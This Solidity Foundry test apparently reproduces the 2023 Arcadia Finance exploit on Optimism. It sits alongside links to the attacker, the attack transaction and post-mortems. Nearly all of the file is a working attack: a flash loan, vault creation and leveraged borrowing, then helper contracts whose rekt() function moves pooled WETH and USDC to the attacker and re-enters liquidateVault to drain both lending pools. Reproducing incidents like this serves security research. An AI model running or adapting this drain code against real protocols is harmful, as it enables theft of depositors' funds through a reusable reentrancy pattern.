// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~400K USD$
// Attacker : https://optimistic.etherscan.io/address/0xd3641c912a6a4c30338787e3c464420b561a9467
// Attack Contract : https://optimistic.etherscan.io/address/0x01a4d9089c243ccaebe40aa224ad0cab573b83c6
// Vulnerable Contract : https://optimistic.etherscan.io/address/0x13c0ef5f1996b4f119e9d6c32f5e23e8dc313109
// Attack Tx : https://optimistic.etherscan.io/tx/0xca7c1a0fde444e1a68a8c2b8ae3fb76ec384d1f7ae9a50d26f8bfdd37c7a0afe

// @Info
// Vulnerable Contract Code : https://optimistic.etherscan.io/address/0x3ae354d7e49039ccd582f1f3c9e65034ffd17bad#code

// @Analysis
// Post-mortem : https://arcadiafinance.medium.com/post-mortem-72e9d24a79b0
// Twitter Guy : https://twitter.com/Phalcon_xyz/status/1678250590709899264
// Twitter Guy : https://twitter.com/peckshield/status/1678265212770693121

interface IFactory {
    function createVault(uint256 salt, uint16 vaultVersion, address baseCurrency) external returns (address vault);
}

interface LendingPool {
    function doActionWithLeverage(
        uint256 amountBorrowed,
        address vault,
        address actionHandler,
        bytes calldata actionData,
        bytes3 referrer
    ) external;
    function liquidateVault(address vault) external;
}

interface IVault {
    function vaultManagementAction(
        address actionHandler,
        bytes calldata actionData
    ) external returns (address, uint256);
    function deposit(
        address[] calldata assetAddresses,
        uint256[] calldata assetIds,
        uint256[] calldata assetAmounts
    ) external;
    function openTrustedMarginAccount(address creditor) external;
}

interface IActionMultiCall {}

contract ContractTest is Test {
    struct ActionData {
        address[] assets; // Array of the contract addresses of the assets.
        uint256[] assetIds; // Array of the IDs of the assets.
        uint256[] assetAmounts; // Array with the amounts of the assets.
        uint256[] assetTypes; // Array with the types of the assets.
        uint256[] actionBalances; // Array with the balances of the actionHandler.
    }

    IERC20 WETH = IERC20(0x4200000000000000000000000000000000000006);
    IERC20 USDC = IERC20(0x7F5c764cBc14f9669B88837ca1490cCa17c31607);
    IAaveFlashloan aaveV3 = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    IFactory Factory = IFactory(0x00CB53780Ea58503D3059FC02dDd596D0Be926cB);
    LendingPool darcWETH = LendingPool(0xD417c28aF20884088F600e724441a3baB38b22cc);
    LendingPool darcUSDC = LendingPool(0x9aa024D3fd962701ED17F76c17CaB22d3dc9D92d);
    IActionMultiCall ActionMultiCall = IActionMultiCall(0x2dE7BbAAaB48EAc228449584f94636bb20d63E65);
    IVault Proxy1;
    IVault Proxy2;

    function setUp() public {
        vm.createSelectFork("optimism", 106_676_494);
        vm.label(address(USDC), "USDC");
        vm.label(address(WETH), "WETH");
        vm.label(address(aaveV3), "aaveV3");
        vm.label(address(Factory), "Factory");
        vm.label(address(darcWETH), "darcWETH");
        vm.label(address(ActionMultiCall), "ActionMultiCall");
    }

    function testExploit() external {
        address[] memory assets = new address[](2);
        assets[0] = address(WETH);
        assets[1] = address(USDC);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 29_847_813_623_947_075_968;
        amounts[1] = 11_916_676_700;
        uint256[] memory modes = new uint[](2);
        modes[0] = 0;
        modes[1] = 0;
        aaveV3.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);

        emit log_named_decimal_uint(
            "Attacker USDC balance after exploit", USDC.balanceOf(address(this)), USDC.decimals()
        );

        emit log_named_decimal_uint(
            "Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()
        );
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        WETH.approve(address(aaveV3), type(uint256).max);
        USDC.approve(address(aaveV3), type(uint256).max);

        WETHDrain(assets[0], amounts[0]);
        USDCDrain(assets[1], amounts[1]);

        return true;
    }

    function WETHDrain(address targetToken, uint256 tokenAmount) internal {
        Proxy1 = IVault(Factory.createVault(15_113, uint16(1), targetToken)); // create vault
        vm.label(address(Proxy1), "Proxy1");

        Proxy1.openTrustedMarginAccount(address(darcWETH)); // open margin account
        WETH.approve(address(Proxy1), type(uint256).max);

        {
            address[] memory assetAddresses = new address[](1);
            assetAddresses[0] = targetToken;
            uint256[] memory assetIds = new uint256[](1);
            assetIds[0] = 0;
            uint256[] memory assetAmounts = new uint256[](1);
            assetAmounts[0] = tokenAmount;
            Proxy1.deposit(assetAddresses, assetIds, assetAmounts); // deposit collateral
        }

        ActionData memory ActionData1 = ActionData({
            assets: new address[](0),
            assetIds: new uint256[](0),
            assetAmounts: new uint256[](0),
            assetTypes: new uint256[](0),
            actionBalances: new uint256[](0)
        });

        ActionData memory ActionData2 = ActionData({
            assets: new address[](1),
            assetIds: new uint256[](1),
            assetAmounts: new uint256[](1),
            assetTypes: new uint256[](1),
            actionBalances: new uint256[](1)
        });
        ActionData2.assets[0] = targetToken;
        address[] memory to = new address[](1);
        to[0] = targetToken;
        bytes[] memory data = new bytes[](1);
        data[0] = abi.encodeWithSignature("approve(address,uint256)", address(Proxy1), type(uint256).max);
        bytes memory callData1 = abi.encode(ActionData1, ActionData2, to, data);
        darcWETH.doActionWithLeverage(
            WETH.balanceOf(address(darcWETH)) - 1e18, address(Proxy1), address(ActionMultiCall), callData1, bytes3(0)
        ); // leveraged lending

        Helper1 helper = new Helper1(address(Proxy1));

        ActionData memory ActionData3 = ActionData({
            assets: new address[](1),
            assetIds: new uint256[](1),
            assetAmounts: new uint256[](1),
            assetTypes: new uint256[](0),
            actionBalances: new uint256[](0)
        });
        ActionData3.assets[0] = targetToken;
        ActionData3.assetIds[0] = 0;
        ActionData3.assetAmounts[0] = WETH.balanceOf(address(Proxy1));
        address[] memory toAddress = new address[](2);
        toAddress[0] = targetToken;
        toAddress[1] = address(helper);
        bytes[] memory datas = new bytes[](2);
        datas[0] = abi.encodeWithSignature("approve(address,uint256)", address(helper), type(uint256).max);
        datas[1] = abi.encodeWithSignature("rekt()");
        bytes memory callData2 = abi.encode(ActionData3, ActionData1, toAddress, datas);
        Proxy1.vaultManagementAction(address(ActionMultiCall), callData2); // transfer all the asset to his own controlled contract and re-entry the function liquidateVault to liquidiate the vault
    }

    function USDCDrain(address targetToken, uint256 tokenAmount) internal {
        Proxy2 = IVault(Factory.createVault(15_114, uint16(1), targetToken)); // create vault
        vm.label(address(Proxy2), "Proxy2");

        Proxy2.openTrustedMarginAccount(address(darcUSDC)); // open margin account
        USDC.approve(address(Proxy2), type(uint256).max);

        {
            address[] memory assetAddresses = new address[](1);
            assetAddresses[0] = targetToken;
            uint256[] memory assetIds = new uint256[](1);
            assetIds[0] = 0;
            uint256[] memory assetAmounts = new uint256[](1);
            assetAmounts[0] = tokenAmount;
            Proxy2.deposit(assetAddresses, assetIds, assetAmounts); // deposit collateral
        }

        ActionData memory ActionData1 = ActionData({
            assets: new address[](0),
            assetIds: new uint256[](0),
            assetAmounts: new uint256[](0),
            assetTypes: new uint256[](0),
            actionBalances: new uint256[](0)
        });
        ActionData memory ActionData2 = ActionData({
            assets: new address[](1),
            assetIds: new uint256[](1),
            assetAmounts: new uint256[](1),
            assetTypes: new uint256[](1),
            actionBalances: new uint256[](1)
        });
        ActionData2.assets[0] = targetToken;
        address[] memory to = new address[](1);
        to[0] = targetToken;
        bytes[] memory data = new bytes[](1);
        data[0] = abi.encodeWithSignature("approve(address,uint256)", address(Proxy2), type(uint256).max);
        bytes memory callData1 = abi.encode(ActionData1, ActionData2, to, data);
        darcUSDC.doActionWithLeverage(
            USDC.balanceOf(address(darcUSDC)) - 50e6, address(Proxy2), address(ActionMultiCall), callData1, bytes3(0)
        ); // leveraged lending

        Helper2 helper = new Helper2(address(Proxy2));

        ActionData memory ActionData3 = ActionData({
            assets: new address[](1),
            assetIds: new uint256[](1),
            assetAmounts: new uint256[](1),
            assetTypes: new uint256[](0),
            actionBalances: new uint256[](0)
        });
        ActionData3.assets[0] = targetToken;
        ActionData3.assetIds[0] = 0;
        ActionData3.assetAmounts[0] = USDC.balanceOf(address(Proxy2));
        address[] memory toAddress = new address[](2);
        toAddress[0] = targetToken;
        toAddress[1] = address(helper);
        bytes[] memory datas = new bytes[](2);
        datas[0] = abi.encodeWithSignature("approve(address,uint256)", address(helper), type(uint256).max);
        datas[1] = abi.encodeWithSignature("rekt()");
        bytes memory callData2 = abi.encode(ActionData3, ActionData1, toAddress, datas);
        Proxy2.vaultManagementAction(address(ActionMultiCall), callData2); // transfer all the asset to his own controlled contract and re-entry the function liquidateVault to liquidiate the vault
    }
}

contract Helper1 {
    address owner;
    address proxy;
    address ActionMultiCall = 0x2dE7BbAAaB48EAc228449584f94636bb20d63E65;
    IERC20 WETH = IERC20(0x4200000000000000000000000000000000000006);
    LendingPool darcWETH = LendingPool(0xD417c28aF20884088F600e724441a3baB38b22cc);

    constructor(address target) {
        owner = msg.sender;
        proxy = target;
    }

    function rekt() external {
        WETH.transferFrom(ActionMultiCall, owner, WETH.balanceOf(address(ActionMultiCall)));
        darcWETH.liquidateVault(proxy);
    }
}

contract Helper2 {
    address proxy;
    address owner;
    address ActionMultiCall = 0x2dE7BbAAaB48EAc228449584f94636bb20d63E65;
    IERC20 USDC = IERC20(0x7F5c764cBc14f9669B88837ca1490cCa17c31607);
    LendingPool darcUSDC = LendingPool(0x9aa024D3fd962701ED17F76c17CaB22d3dc9D92d);

    constructor(address target) {
        owner = msg.sender;
        proxy = target;
    }

    function rekt() external {
        USDC.transferFrom(ActionMultiCall, owner, USDC.balanceOf(address(ActionMultiCall)));
        darcUSDC.liquidateVault(proxy);
    }
}
